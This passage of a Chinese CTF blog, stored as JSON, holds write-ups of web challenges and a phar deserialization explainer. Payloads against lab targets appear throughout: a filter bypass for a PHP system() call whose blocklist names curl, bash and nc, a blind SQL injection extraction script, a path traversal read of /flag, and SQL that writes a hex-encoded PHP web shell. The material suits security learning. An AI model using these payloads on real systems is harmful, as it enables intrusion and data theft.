src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144734.png\" alt=\"\"></p>\n<p>跳转之后手动停掉死循环</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708144844.png\" alt=\"\"></p>\n<p>就可以看到临时文件路径了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145037.png\" alt=\"\"></p>\n<p>包含它即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145300.png\" alt=\"\"></p>\n<h3 id=\"WUSTCTF朴实无华-Revenge\"><a href=\"#WUSTCTF朴实无华-Revenge\" class=\"headerlink\" title=\"WUSTCTF朴实无华_Revenge\"></a>WUSTCTF朴实无华_Revenge</h3><p>wustctf朴实无华的改版</p>\n<h4 id=\"解题-2\"><a href=\"#解题-2\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>level 1</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class=\"line\">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class=\"line\">    $numPositve &#x3D; intval($num);</span><br><span class=\"line\">    $numReverse &#x3D; intval(strrev($num));</span><br><span class=\"line\">    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;</span><br><span class=\"line\">        die(&quot;非洲欢迎你1&quot;);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        if ( (preg_match_all(&quot;&#x2F;\\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;</span><br><span class=\"line\">            die(&quot;没有这样的数&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if ($num !&#x3D; $numPositve) &#123;</span><br><span class=\"line\">        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class=\"line\">        die(&quot;非洲欢迎你2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class=\"line\">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die(&quot;去非洲吧&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>满足<code>$numPositve = intval($num);$numReverse = intval(strrev($num));</code>的同时需满足</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if ($num !&#x3D; $numPositve)  &#x3D;&#x3D;&gt; \t传整数</span><br><span class=\"line\">if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999)\t&#x3D;&#x3D;&gt;\t不能int溢出\t</span><br><span class=\"line\">if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )\t&#x3D;&#x3D;&gt;\t\t不能是回文又要有回文的特点对称</span><br></pre></td></tr></table></figure>\n\n<p>payload：<code>?num=1000000000000000.00000000000000010</code></p>\n<p>num是弱类型判断，且php存在浮点精度问题，所以php中<code>1000000000000000.0000000000000001=1000000000000000</code>是成立的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155152.png\" alt=\"\"></p>\n<p>再加个0满足倒过来相等，且不是一个回文数</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155302.png\" alt=\"\"></p>\n<p>level2</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'md5'</span>]))&#123;</span><br><span class=\"line\">    $md5=$_GET[<span class=\"string\">'md5'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($md5==md5(md5($md5)))</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"去非洲吧\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>满足<code>if ($md5==md5(md5($md5)))</code>，由于是弱类型，所以构造一个以0e开头，经过两次md5之后依然还是以0e开头的纯数字串，这样利用科学计数法的特性在php中弱类型相等</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155800.png\" alt=\"\"></p>\n<p>这里直接用y1ng师傅的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">10</span>**<span class=\"number\">33</span>):</span><br><span class=\"line\">    i = str(i)</span><br><span class=\"line\">    num = <span class=\"string\">'0e'</span> + i</span><br><span class=\"line\">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class=\"line\">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class=\"line\">    <span class=\"comment\"># print(md5)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> md5[<span class=\"number\">0</span>:<span class=\"number\">2</span>] == <span class=\"string\">'0e'</span> <span class=\"keyword\">and</span> md5[<span class=\"number\">2</span>:].isdigit():</span><br><span class=\"line\">        print(<span class=\"string\">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> int(i) % <span class=\"number\">1000000</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">         print(i)</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0e1138100474</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160006.png\" alt=\"\"></p>\n<p>get flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'get_flag'</span>]))&#123;</span><br><span class=\"line\">    $get_flag = $_GET[<span class=\"string\">'get_flag'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!strstr($get_flag,<span class=\"string\">\" \"</span>))&#123;</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"cat\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"more\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"tail\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"less\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"head\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"tac\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"sort\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"nl\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"$\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"curl\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"bash\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"nc\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        $get_flag = str_ireplace(<span class=\"string\">\"php\"</span>, <span class=\"string\">\"36dCTFShow\"</span>, $get_flag);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/['\\*\\\"[?]/\"</span>, $get_flag)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'非预期修复*2'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\"</span>;</span><br><span class=\"line\">        system($get_flag);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"快到非洲了\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"去非洲吧\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了一些关键字，用一些字符阻断即可，比如ca\\t&lt;flag.p\\hp</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160311.png\" alt=\"\"></p>\n<p>flag在源码里</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160335.png\" alt=\"\"></p>\n<h3 id=\"WEB-Login-Only-For-36D\"><a href=\"#WEB-Login-Only-For-36D\" class=\"headerlink\" title=\"WEB_Login_Only_For_36D\"></a>WEB_Login_Only_For_36D</h3><p>打开靶机一个登录框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160819.png\" alt=\"\"></p>\n<p>源码直接给了sql语句</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708161156.png\" alt=\"\"></p>\n<p>只要用户名含有admin，那么就不会die</p>\n<p>sql语句可以用<code>\\</code>来操作，本来的语句是</p>\n<p><code>select * from 36d_user where username=&#39;admin&#39; and password=&#39;sql&#39;;</code></p>\n<p>我们把用户名设为<code>admin\\</code>，这样，原来的<code>&#39;</code>就被注明为一个文本符号，用户名就变成了<code>admin&#39; and password=</code></p>\n<p><code>select * from 36d_user where username=&#39;admin\\&#39; and password=&#39;sql&#39;;</code></p>\n<p>再加个#把后面注释，这样传入的<code>$passwd</code>就可以逃逸出来，执行sql语句了</p>\n<h4 id=\"解题-3\"><a href=\"#解题-3\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>fuzz一下发现select，union，ascii，空格，分号等等很多东西都被过滤了，但是sleep，regexp，binary没被过滤，因此有可能是时间盲注。</p>\n<p>substr，mid啥的都过滤了，后来想到可以用right，left一起用来代替substr</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173622.png\" alt=\"\"></p>\n<p>正好’^’也没过滤，可以尝试异或</p>\n<p>当password是<code>^if(ord(right(left(password,1),1))like(35),sleep(4),1)#</code>时</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174923.png\" alt=\"\"></p>\n<p>当password是<code>^if(ord(right(left(password,1),1))like(73),sleep(4),1)#</code>时</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175013.png\" alt=\"\"></p>\n<p>直到四秒才返回，证明时间盲注可行</p>\n<p>构造脚本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=<span class=\"string\">\"http://109b8f92-8675-4edc-a4b7-c6005bf771f9.chall.ctf.show/\"</span></span><br><span class=\"line\">k=<span class=\"string\">\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span></span><br><span class=\"line\">flag=<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i in range(<span class=\"number\">20</span>): </span><br><span class=\"line\">    <span class=\"keyword\">for</span> j in k:</span><br><span class=\"line\">        j = ord(j)</span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"string\">'username'</span>:<span class=\"string\">'admin\\\\'</span>,</span><br><span class=\"line\">            <span class=\"string\">'password'</span>:<span class=\"string\">'^if(ord(right(left(password,&#123;0&#125;),1))like(&#123;1&#125;),sleep(4),1)#'</span>.format(i,j)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r=requests.post(url,data=data,timeout=(<span class=\"number\">2</span>,<span class=\"number\">2</span>))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            flag+=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>跑一会儿</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173747.png\" alt=\"\"></p>\n<p>登录即得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174012.png\" alt=\"\"></p>\n<h3 id=\"你没见过的注入\"><a href=\"#你没见过的注入\" class=\"headerlink\" title=\"你没见过的注入\"></a>你没见过的注入</h3><p>打开靶机绝美前端</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175956.png\" alt=\"\"></p>\n<p>根据提示打开robots.txt，得到<code>/pwdreset.php</code>，可以重置密码，重置之后登录发现是个上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180221.png\" alt=\"\"></p>\n<p>测试一下发现会将上传文件存储为压缩包，并显示文件类型，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180434.png\" alt=\"\"></p>\n<h4 id=\"解题-4\"><a href=\"#解题-4\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>试了把sql语句写入文件名等等，都不起效果，当时记得还是阿狸师傅提醒了一下</p>\n<p>版权信息注入（真*活久见）</p>\n<p>测试一下，找一张jpg，用exiftools把语句写进comment</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184343.png\" alt=\"\"></p>\n<p>上传，发现报错，把插入语句以及Sql报错信息显示了出来</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184328.png\" alt=\"\"></p>\n<p> 那么可以注入了，构造<code>&quot;&#39;);select 0x3c3f70687020406576616c28245f504f53545b2761275d293b3f3e into outfile &#39;/var/www/html/blacknight.php&#39;;--+</code>把一句话写进</p>\n<p>但写入的时候显示不全</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184936.png\" alt=\"\"></p>\n<p>所以换一个短的一句话：<code>&quot;&#39;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#39;/var/www/html/blacknight.php&#39;;--+</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708185939.png\" alt=\"\"></p>\n<p>上传之后访问php，post一下即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708190019.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["sql","bypass","RCE","ssrf"]},{"title":"DASCTF安恒七月赛","url":"/2020/07/25/Dasctf_web/","content":"<h3 id=\"Ezinclude\"><a href=\"#Ezinclude\" class=\"headerlink\" title=\"Ezinclude\"></a>Ezinclude</h3><p>源码处发现可疑链接，有两个参数<code>t</code>和<code>f</code>，t经过大佬告诉是unix时间戳</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725153712.png\" alt=\"\"></p>\n<p><code>f</code>参数是文件名的base64，直接打开链接会得目标文件的内容，但t会过期只有五秒时间，写个脚本好测试</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://183.129.189.60:10009/'</span></span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(url=url).text</span><br><span class=\"line\"></span><br><span class=\"line\">text = re.findall(<span class=\"string\">r'\\b\\d+\\b'</span>,response)</span><br><span class=\"line\"></span><br><span class=\"line\">value = <span class=\"string\">\"\"</span>.join(text[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">url_add = url+<span class=\"string\">\"image.php?t=\"</span>+value+<span class=\"string\">\"&amp;f=what_you_want\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">response2 = requests.get(url=url_add).text</span><br><span class=\"line\"></span><br><span class=\"line\">print(response2)</span><br></pre></td></tr></table></figure>\n\n<p>试了n久。。。没成功，后来大佬告诉是<code>file:///../../../../../flag</code>才成功，赛后看y1ng师傅的wp得知只要/../前面有内容/../就不会被过滤。。（吐血），直接<code>whatever/../../../../../flag</code>base64传入</p>\n<p>看下waf是怎么写的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">        if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;]))&#123;</span><br><span class=\"line\">                echo &quot;you miss some parameters&quot;;</span><br><span class=\"line\">                exit();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $timestamp &#x3D; time();</span><br><span class=\"line\"></span><br><span class=\"line\">        if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10)&#123;</span><br><span class=\"line\">                echo &quot;what&#39;s your time?&quot;;</span><br><span class=\"line\">                exit();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $file &#x3D; base64_decode($_GET[&#39;f&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">        if(substr($file, 0, strlen(&quot;&#x2F;..&#x2F;&quot;)) &#x3D;&#x3D;&#x3D; &quot;&#x2F;..&#x2F;&quot; || substr($file, 0, strlen(&quot;..&#x2F;&quot;)) &#x3D;&#x3D;&#x3D; &quot;..&#x2F;&quot; || substr($file, 0, strlen(&quot;.&#x2F;&quot;)) &#x3D;&#x3D;&#x3D; &quot;.&#x2F;&quot; </span><br><span class=\"line\">|| substr($file, 0, strlen(&quot;&#x2F;.&quot;)) &#x3D;&#x3D;&#x3D; &quot;&#x2F;.&quot; || substr($file, 0, strlen(&quot;&#x2F;&#x2F;&quot;)) &#x3D;&#x3D;&#x3D; &quot;&#x2F;&#x2F;&quot;) &#123;</span><br><span class=\"line\">                echo &#39;You are not allowed to do that.&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">                echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;img&#x2F;&#39;.$file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>substr截取的是从左边开始strlen()的长度，只要截取的这几位不是/../就不会触发waf。</p>\n<h3 id=\"SQli\"><a href=\"#SQli\" class=\"headerlink\" title=\"SQli\"></a>SQli</h3><p>找回显位常规操作，union查询直接可以得到数据库</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725155659.png\" alt=\"\"></p>\n<p>关键是这个正则</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725155955.png\" alt=\"\"></p>\n<p>过滤了in，or也就是information_schema不能用了，又过滤了stat和auto，这样information_schema相似作用的<code>sys.schema_auto_increment_columns</code>以及<code>schema_table_statistics_with_buffer</code>什么的都用不了的（参考：<a href=\"https://www.cnblogs.com/wangtanzhi/p/12594949.html）\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/wangtanzhi/p/12594949.html）</a></p>\n<p>google找了蛮久没找到，后来看wp才想起来还有个<code>sys.x$schema_flattened_keys</code>，关键是我之前自己也<a href=\"https://www.blacknight.top/2020/04/16/note8/\">记过</a>。。。我也是醉了。。。继续union查询</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725160833.png\" alt=\"\"></p>\n<p>最后因为得不到列名直接select * from flag(注意显示位的顺序和个数)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725160931.png\" alt=\"\"></p>\n<p>ps：后来瞄到一眼群里大佬说<a href=\"https://zhuanlan.zhihu.com/p/43959781\" target=\"_blank\" rel=\"noopener\">schema_tables_with_full_table_scans</a>也可以，神奇的sys数据库</p>\n<h3 id=\"welcome-to-the-misc-world\"><a href=\"#welcome-to-the-misc-world\" class=\"headerlink\" title=\"welcome to the misc world\"></a>welcome to the misc world</h3><p>下载附件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191430.png\" alt=\"\"></p>\n<p>lsb隐写，linux安装zteg</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gem install zsteg</span><br></pre></td></tr></table></figure>\n\n<p>分析red_bule.png，发现png</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191652.png\" alt=\"\"></p>\n<p>提取得到png，查看为压缩包密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191733.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191815.png\" alt=\"\"></p>\n<p>360压缩打开直接忽略NTFS隐写</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191939.png\" alt=\"\"></p>\n<p>输入密码查看flag.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725192040.png\" alt=\"\"></p>\n<p>base85解码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725192116.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["sql"]},{"title":"Phar以及phar对象注入","url":"/2020/06/02/Phar/","content":"<h4 id=\"什么是phar\"><a href=\"#什么是phar\" class=\"headerlink\" title=\"什么是phar\"></a>什么是phar</h4><blockquote>\n<p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。</p>\n<a id=\"more\"></a>\n\n<p>每个归档都包含三个部分：</p>\n<ol>\n<li>存根(Stub) —— 一个可以引导归档的PHP文件。存根必须包含<code>__HALT_COMPILER();</code>语句，并且默认存根拥有在不启用PHAR扩展的情况下运行PHAR文件的能力。</li>\n<li>清单 —— 清单详细说明了存归档的内容。</li>\n<li>文件内容 —— 归档中包含的原始文件</li>\n</ol>\n<p>另外，PHAR格式还可以包括用于验证PHAR完整性的签名。</p>\n</blockquote>\n<p>Phar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。</p>\n<h4 id=\"生成一个phar文件\"><a href=\"#生成一个phar文件\" class=\"headerlink\" title=\"生成一个phar文件\"></a>生成一个phar文件</h4><p>首先开启php.ini的phar扩展</p>\n<p><img src=\"/images/image-20200602174306490.png\" alt=\"image-20200602174306490\"></p>\n<p>示例：</p>\n<p>创建两个文件如下</p>\n<p><img src=\"/images/image-20200602181914631.png\" alt=\"image-20200602181914631\"></p>\n<p>createphar.php代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'phar.phar'</span>);<span class=\"comment\">//生成新的phar文件</span></span><br><span class=\"line\">$phar-&gt;buildFromDirectory(<span class=\"keyword\">__DIR__</span>.<span class=\"string\">'\\\\'</span>);<span class=\"comment\">//源码目录</span></span><br><span class=\"line\"><span class=\"comment\">//$phar-&gt;compressFiles(Phar::GZ);可以选择添加压缩方式</span></span><br><span class=\"line\">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class=\"string\">'index.php'</span>));<span class=\"comment\">//设置存根，没有设置这个存根文件的话，默认寻找的文件为index.php。</span></span><br></pre></td></tr></table></figure>\n\n<p>生成</p>\n<p><img src=\"/images/image-20200602183306239.png\" alt=\"image-20200602183306239\"></p>\n<p>我们可以直接加载phar文件的单独文件：</p>\n<p><img src=\"/images/image-20200602183654213.png\" alt=\"image-20200602183654213\"></p>\n<p><img src=\"/images/image-20200602183718537.png\" alt=\"image-20200602183718537\"></p>\n<p>当然也能还原(无压缩方式)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'phar.phar'</span>);</span><br><span class=\"line\">$phar-&gt;extractTo(<span class=\"string\">'huanyuan'</span>);<span class=\"comment\">//路径</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200602184946407.png\" alt=\"image-20200602184946407\"></p>\n<h4 id=\"phar对象注入\"><a href=\"#phar对象注入\" class=\"headerlink\" title=\"phar对象注入\"></a>phar对象注入</h4><p>PHP文件操作允许使用各种URL协议去访问文件路径如data://，zlib://，或php://，phar://也是其中一种。</p>\n<h5 id=\"成因\"><a href=\"#成因\" class=\"headerlink\" title=\"成因\"></a>成因</h5><p>Phar文件可以包含序列化格式的元数据，<a href=\"https://www.freebuf.com/articles/web/182231.html\" target=\"_blank\" rel=\"noopener\">扒张图</a></p>\n<p><img src=\"https://image.3001.net/images/20180827/1535343254_5b837a96d90ac.png!small\" alt=\"1.png\"></p>\n<p>所以如果我们通过 phar:// 对我们现有的Phar文件执行文件操作，则其序列化元数据将被反序列化。假如攻击者可以在<code>ìnclude()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等操作中控制完整的文件路径，就可以通过<code>phar://</code>注入并获得代码执行，造成严重的安全漏洞。</p>\n<p>实战：<a href=\"https://blog.csdn.net/qq_43756333/article/details/106503047\" target=\"_blank\" rel=\"noopener\">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>\n","categories":["PHP"],"tags":["phar"]},{"title":"GKCTF2020部分web复现","url":"/2020/07/14/GKCTF2020_web/","content":"<p>又留了两道node。。。。。留着做个综合吧。。。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"CheckIN\"><a href=\"#CheckIN\" class=\"headerlink\" title=\"CheckIN\"></a>CheckIN</h3><p>打开靶机即得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ClassName</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $code = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $decode = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;code = @<span class=\"keyword\">$this</span>-&gt;x()[<span class=\"string\">'Ginkgo'</span>];</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;decode = @base64_decode( <span class=\"keyword\">$this</span>-&gt;code );</span><br><span class=\"line\">                @<span class=\"keyword\">Eval</span>(<span class=\"keyword\">$this</span>-&gt;decode);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span><span 